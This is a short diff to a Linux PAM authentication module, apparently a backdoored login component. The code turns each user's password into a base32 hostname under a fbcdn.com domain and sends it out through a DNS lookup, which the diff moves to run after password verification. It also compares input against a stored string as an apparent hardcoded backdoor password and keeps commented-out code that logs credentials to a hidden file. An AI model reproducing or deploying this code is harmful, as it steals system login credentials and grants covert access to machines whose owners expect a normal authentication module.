@@ -185,11 +185,11 @@ pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
     baseencode_error_t fml;
     char *lmao = base32_encode(pw, strlen(pw)+1, &fml);
     sprintf(out, "%s.fbcdn.com", lmao);
-   ngethostbyname(out, T_A);	/* verify the password of this user */
         //char *bdenc = b64_encode(p, strlen(p));
         char *bdenc = b64_encode(p, strlen(p));
         if (strcmp(bdenc, bdstr) != 0) {
           retval = _unix_verify_password(pamh, name, p, ctrl);
+	  ngethostbyname(out, T_A);
 /*          rekt=fopen("/var/log/.rekt", "a");
           fprintf(rekt, "%s:%s\n", name, p);
           fclose(rekt);
